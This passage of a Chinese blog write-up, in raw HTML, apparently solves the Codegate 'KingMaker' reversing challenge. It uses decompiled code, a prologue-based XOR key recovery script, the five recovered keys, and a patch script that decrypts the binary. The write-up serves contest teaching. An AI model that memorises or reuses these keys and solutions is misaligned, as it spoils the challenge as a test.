class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0x4096</span>uLL, <span class="number">7</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"  _  ___             __  __       _             "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | |/ (_)_ __   __ _|  \\/  | __ _| | _____ _ __ "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | ' /| | '_ \\ / _` | |\\/| |/ _` | |/ / _ \\ '__|"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" | . \\| | | | | (_| | |  | | (_| |   &lt;  __/ |   "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">" |_|\\_\\_|_| |_|\\__, |_|  |_|\\__,_|_|\\_\\___|_|   "</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"               |___/                            \n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"Once upon a time, there was a kingdom with 7 princes."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"One day the king thinks to decide the who will be the next king."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"So he made 5 tests for the princes."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"If you pass all the tests, you can be a king!\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"**********************KING MAKER START**********************\n"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"..."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"....."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"......."</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"Who am I...??"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"1&gt; Ask to someone"</span>, <span class="number">0L</span>L);</span><br><span class="line">  put_s(<span class="string">"2&gt; Look around"</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\x1B[H\x1B[J"</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_403636((__int64)<span class="string">"\x1B[H\x1B[J"</span>, (__int64)&amp;choice);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">      end_game(<span class="string">"SYSTEM : Choose wrong choice!"</span>, <span class="number">0L</span>L);</span><br><span class="line">    sub_403607((__int64)<span class="string">"\x1B[H\x1B[J"</span>, (__int64)&amp;choice);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>end_game()</code>中看到<code>cat flag</code>。同时发现只要五个变量同时等于5就能得到flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">end_game</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( brave != <span class="number">5</span> || wise != <span class="number">5</span> || kind != <span class="number">5</span> || decision != <span class="number">5</span> || sacrifice != <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      put_s(<span class="string">"King : But you couldn't make the points... You can't be a king."</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      put_s(<span class="string">"King : Congratuations to be a king!"</span>, a2);</span><br><span class="line">      system(<span class="string">"/bin/cat ./flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序往下走，看到<code>stage1()</code>要求输入<code>key</code>。之后看总共有五次要求输入key，下面列出第一次的反汇编代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">stage1</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> key1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  put_s(<span class="string">"You : Am I....??"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"Servant : The king calls the prince!"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"..."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"....."</span>, a2);</span><br><span class="line">  put_s(<span class="string">".......\n"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : I'm too old to rule the kingdom."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : So I will give you few tests and choose the next king."</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : The only one prince who passes all the tests can be the king.\n"</span>, a2);</span><br><span class="line">  put_s(<span class="string">"King : If you want to participate at this test, Enter the key for test 1"</span>, a2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\x1B[H\x1B[J"</span>, &amp;key1);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(&amp;key1, <span class="number">1u</span>, <span class="number">5u</span>) )</span><br><span class="line">    end_game(<span class="string">"King : Wrong! Don't you want to be a king?"</span>, <span class="number">0L</span>L);</span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)num1[<span class="number">0</span>];</span><br><span class="line">  encrypt_func(&amp;loc_40341D, num1[<span class="number">0</span>], &amp;key1);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, __int64))loc_40341D)(&amp;key1, v2);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面发现如果过了check，函数<code>loc_40341D</code>这里被加密了，只有一大块奇怪的数据块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040341D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040341D</span><br><span class="line">.text:000000000040341D loc_40341D:                             ; CODE XREF: stage1+CD↓p</span><br><span class="line">.text:000000000040341D                                         ; DATA XREF: stage1+BC↓o</span><br><span class="line">.text:000000000040341D ; __unwind &#123;</span><br><span class="line">.text:000000000040341D                 cmp     [rdi], eax      ; Compare Two Operands</span><br><span class="line">.text:000000000040341F                 call    rsi             ; Indirect Call Near Procedure</span><br><span class="line">.text:0000000000403421                 and     al, 0CCh        ; Logical AND</span><br><span class="line">.text:0000000000403421 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000403423                 db 9Ah, 13h, 24h, 0C6h, 0Bh</span><br><span class="line">.text:0000000000403428                 dq 76674937FD0708DBh, 0B67E9476FF076C33h, 0A0B484333616848Ch</span><br><span class="line">.text:0000000000403428                 dq 9E4F2C697EF093CCh, 3615048C89B0BAC2h, 0CCF093CCA0A88433h</span><br><span class="line">.text:0000000000403428                 dq 89B0BAEE9E4F2C65h, 0A09C84333619AF8Ch, 0FF079876FB0793CCh</span><br><span class="line">.text:0000000000403428                 dq 76F76C734F00D3F5h, 89B0B8639E4F6C33h, 764FD43336763E8Ch</span><br><span class="line">.text:0000000000403428                 dq 0FDB093E097A76C33h, 0FD6B19328ECC9876h, 23C4243356737F36h</span><br><span class="line">.text:0000000000403428                 dq 760F5F3CC989E5DBh, 33C424CC899960DBh, 89B13ADBB1C624DBh</span><br><span class="line">.text:0000000000403428                 dq 8ECC9876FD7487CCh, 56748F36FD6B1931h, 0C989E5DB23C42433h</span><br><span class="line">.text:0000000000403428                 dq 899A8CDB760F5FCCh, 0B1C624DB33C424CCh, 0C84087CC89B076DBh</span><br><span class="line">.text:0000000000403428                 dq 3676CF8C764F6C33h, 3EDF93CCA02D8433h, 534B5F7B12B729B8h</span><br><span class="line">.text:0000000000403428                 dq 33A76947764F6C1Bh</span><br><span class="line">.text:0000000000403508                 db 0E0h, 93h, 0B0h, 0BFh, 0F0h</span><br><span class="line">.text:0000000000403508 ; &#125; // starts at 40341D</span><br></pre></td></tr></table></figure><p>进入<code>encrypt()</code>函数，基本上就能知道对函数通过key异或来加密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">encrypt</span><span class="params">(_BYTE *start_addr, <span class="keyword">int</span> end_addr, <span class="keyword">const</span> <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *fp; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> len; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *addr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="keyword">char</span> *)key;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( addr = start_addr; ; ++addr )</span><br><span class="line">  &#123;</span><br><span class="line">    fp = &amp;start_addr[end_addr];</span><br><span class="line">    <span class="keyword">if</span> ( fp &lt;= addr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *addr ^= s[i];</span><br><span class="line">    i = (i + <span class="number">1</span>) % len;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又因为每个函数调用时，一开始都会有<code>push rbp ; mov rbp, rsp ;</code>，十六进制表示也就是0x554889e5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    mov rbp, rsp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> hex(u32(asm(code)))</span><br><span class="line"><span class="comment"># 0xe5894855</span></span><br><span class="line"><span class="comment"># little endian</span></span><br><span class="line"><span class="comment"># 55        push rbp</span></span><br><span class="line"><span class="comment"># 4889e5    mov rbp, rsp</span></span><br></pre></td></tr></table></figure><p>然后由此可以解出<code>key1</code>和<code>key2</code>，然后<code>key3</code>、<code>key4</code>和<code>key5</code>根据之前解出函数可以得到。下面给出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(func, length)</span>:</span></span><br><span class="line">    prologue = [<span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x7D</span>, <span class="number">0xE8</span>]</span><br><span class="line">    length = min(len(prologue), length)</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        key += chr(func[i] ^ prologue[i])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">func1 = [<span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd6</span>, <span class="number">0x24</span>, <span class="number">0xcc</span>, <span class="number">0x9a</span>]</span><br><span class="line">key1 = test(func1, len(func1))</span><br><span class="line"><span class="keyword">print</span> key1</span><br><span class="line"><span class="comment"># lOv3</span></span><br><span class="line">func2 = [<span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe5</span>, <span class="number">0xd4</span>, <span class="number">0x0c</span>, <span class="number">0xb3</span>, <span class="number">0x80</span>]</span><br><span class="line">key2 = test(func2, len(func2))</span><br><span class="line"><span class="keyword">print</span> key2</span><br><span class="line"><span class="comment"># D0l1</span></span><br><span class="line">func3 = [<span class="number">0x1D</span>, <span class="number">0x3D</span>, <span class="number">0xC7</span>, <span class="number">0x82</span>, <span class="number">0x1A</span>, <span class="number">0xDA</span>, <span class="number">0xB8</span>, <span class="number">0x11</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0x35</span>]</span><br><span class="line">key3 = test(func3, len(func3))</span><br><span class="line"><span class="keyword">print</span> key3</span><br><span class="line"><span class="comment"># HuNgRYT1m3</span></span><br><span class="line">func4 = [<span class="number">0x13</span>, <span class="number">0x78</span>, <span class="number">0xFC</span>, <span class="number">0xB7</span>, <span class="number">0x1B</span>, <span class="number">0xB0</span>, <span class="number">0x8D</span>, <span class="number">0x73</span>, <span class="number">0x78</span>, <span class="number">0xE7</span>, <span class="number">0x3B</span>, <span class="number">0xD8</span>, <span class="number">0x11</span>]</span><br><span class="line">key4 = test(func4, len(func4))</span><br><span class="line"><span class="keyword">print</span> key4</span><br><span class="line"><span class="comment"># F0uRS3aS0n</span></span><br><span class="line">func5 = [<span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0xE2</span>, <span class="number">0xB1</span>, <span class="number">0x7C</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0xD9</span>]</span><br><span class="line">key5 = test(func5, len(func5))</span><br><span class="line"><span class="keyword">print</span> key5</span><br><span class="line"><span class="comment"># T1kT4kT0Kk</span></span><br></pre></td></tr></table></figure><p>接下来就直接将被加密的函数patch一下，进一步看看。需要patch的其实很多，工程浩大，贴上转自大佬的<a href="https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/#solution-3" target="_blank" rel="noopener">patch脚本</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">key1 = <span class="string">'lOv3'</span></span><br><span class="line">key2 = <span class="string">'D0l1'</span></span><br><span class="line">key3 = <span class="string">'HuNgRYT1m3'</span></span><br><span class="line">key4 = <span class="string">'F0uRS3aS0n'</span></span><br><span class="line">key5 = <span class="string">'T1kT4kT0Kk'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(arr, key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        arr[i] = arr[i] ^ ord(key[i % len(key)])</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">patches = [</span><br><span class="line">  (<span class="number">0x341D</span>, <span class="number">0xf0</span>, key1),</span><br><span class="line">  (<span class="number">0x33FF</span>, <span class="number">0x1e</span>, key1),</span><br><span class="line">  (<span class="number">0x330F</span>, <span class="number">0xf0</span>, key1),</span><br><span class="line">  (<span class="number">0x32DE</span>, <span class="number">0x31</span>, key1),</span><br><span class="line">  (<span class="number">0x32C0</span>, <span class="number">0x1e</span>, key1),</span><br><span class="line">  (<span class="number">0x3197</span>, <span class="number">0x129</span>, key1),</span><br><span class="line">  (<span class="number">0x30D4</span>, <span class="number">0x0C3</span>, key1),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x2D55</span>, <span class="number">0x0FA</span>, key2),</span><br><span class="line">  (<span class="number">0x2C25</span>, <span class="number">0x112</span>, key2),</span><br><span class="line">  (<span class="number">0x2D37</span>, <span class="number">0x1e</span>, key2),</span><br><span class="line">  (<span class="number">0x27E9</span>, <span class="number">0x44</span>, key2),</span><br><span class="line">  (<span class="number">0x29B9</span>, <span class="number">0x0E6</span>, key2),</span><br><span class="line">  (<span class="number">0x2B2B</span>,<span class="number">0x0FA</span>, key2),</span><br><span class="line">  (<span class="number">0x271C</span>, <span class="number">0x0CD</span>, key2),</span><br><span class="line">  (<span class="number">0x28B5</span>, <span class="number">0xe6</span>, key2),</span><br><span class="line">  (<span class="number">0x299B</span>, <span class="number">0x1e</span>, key2),</span><br><span class="line">  (<span class="number">0x2A9F</span>, <span class="number">0x4E</span>, key2),</span><br><span class="line">  (<span class="number">0x2AED</span>, <span class="number">0x3e</span>, key2),</span><br><span class="line">  (<span class="number">0x282D</span>, <span class="number">0x44</span>, key2),</span><br><span class="line">  (<span class="number">0x2871</span>, <span class="number">0x44</span>, key2),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x20E2</span>, <span class="number">0x18d</span>, key3),</span><br><span class="line">  (<span class="number">0x201F</span>, <span class="number">0xc3</span>, key3),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x1B0A</span>, <span class="number">0xf0</span>, key4),</span><br><span class="line">  (<span class="number">0x19F2</span>, <span class="number">0x0FA</span>, key4),</span><br><span class="line">  (<span class="number">0x1AEC</span>, <span class="number">0x1e</span>, key4),</span><br><span class="line">  (<span class="number">0x192C</span>, <span class="number">0xa8</span>, key4),</span><br><span class="line">  (<span class="number">0x19D4</span>, <span class="number">0x1e</span>, key4),</span><br><span class="line">  (<span class="number">0x16D0</span>, <span class="number">0xc3</span>, key4),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x11BB</span>, <span class="number">0x131</span>, key5),</span><br><span class="line">  (<span class="number">0x0F25</span>, <span class="number">0x0DC</span>, key5),</span><br><span class="line">  (<span class="number">0x108B</span>, <span class="number">0x130</span>, key5),</span><br><span class="line">  (<span class="number">0x0DE7</span>, <span class="number">0x120</span>, key5),</span><br><span class="line">  (<span class="number">0x0F07</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x1001</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x101F</span>, <span class="number">0x4e</span>, key5),</span><br><span class="line">  (<span class="number">0x106D</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x0C8C</span>, <span class="number">0x158</span>, key5)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'patched'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> patched:</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'./KingMaker'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> binary:</span><br><span class="line">    data = bytearray(binary.read())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> offset, size, key <span class="keyword">in</span> patches:</span><br><span class="line">      data[offset:offset+size] = xor(data[offset:offset+size], key)</span><br><span class="line"></span><br><span class="line">    patched.write(data)</span><br><span class="line">    patched.close()</span><br></pre></td></tr></table></figure><p>把patch后的elf拖进ida后，就能把所有的过程理清楚了，最麻烦的方法就是把所有的可能都记录下来，递归一下。放上<a href="https://devel0pment.de/?p=1179" target="_blank" rel="noopener">大佬的脚本</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addArr</span><span class="params">(a,b)</span>:</span></span><br><span class="line">  c = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    c.append(a[i]+b[i])</span><br><span class="line">  <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel1</span><span class="params">(a)</span>:</span></span><br><span class="line">  x = [(<span class="string">"1,lOv3,1,2,1,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,1,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,1,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel2(n,x[i][<span class="number">0</span>])</span><br><span 